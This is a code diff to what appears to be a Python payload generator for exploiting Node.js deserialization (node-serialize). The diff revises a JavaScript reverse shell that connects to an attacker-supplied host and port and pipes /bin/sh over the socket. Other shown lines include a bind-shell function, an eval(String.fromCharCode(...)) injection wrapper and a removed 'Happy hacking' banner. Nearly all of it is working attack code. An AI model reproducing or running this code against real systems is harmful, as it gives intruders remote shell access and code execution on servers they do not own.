@@ -57,23 +57,29 @@ def get_reverse_shell():
     PORT="%s";
     TIMEOUT="5000";
     if (typeof String.prototype.contains === 'undefined') { String.prototype.contains = function(it) { return this.indexOf(it) != -1; }; }
-    function c(HOST,PORT) {
-        var client = new net.Socket();
-        client.connect(PORT, HOST, function() {
-            var sh = spawn('/bin/sh',[]);
-            client.write("Connected!\\n");
-            client.pipe(sh.stdin);
-            sh.stdout.pipe(client);
-            sh.stderr.pipe(client);
-            sh.on('exit',function(code,signal){
-              client.end("Disconnected!\\n");
+
+        try {
+            var client = new net.Socket();
+            client.connect(PORT, HOST, function() {
+                var sh = spawn('/bin/sh',[]);
+                client.write("Connected!\\n");
+                client.pipe(sh.stdin);
+                sh.stdout.pipe(client);
+                sh.stderr.pipe(client);
+                sh.on('exit',function(code,signal){
+                  client.end("Disconnected!\\n");
+                });
             });
-        });
-        client.on('error', function(e) {
-            setTimeout(c(HOST,PORT), TIMEOUT);
-        });
-    }
-    c(HOST,PORT);
+            client.on('error', function(e) {
+                console.log("Error\\n");
+            });
+            client.on('end', function() {
+                console.log('Connection closed\\n');
+            });
+        } catch (ex) {
+            console.log(ex);
+        }
+
     ''' % (host, port)
 
 def get_bind_shell():
@@ -122,7 +128,4 @@ if object:
     {"run": "_$$ND_FUNC$$_function (){eval(String.fromCharCode(%s))}()"}
     ''' % (payload)
 
-print '''
-    =======> Happy hacking <======
-'''
 print payload
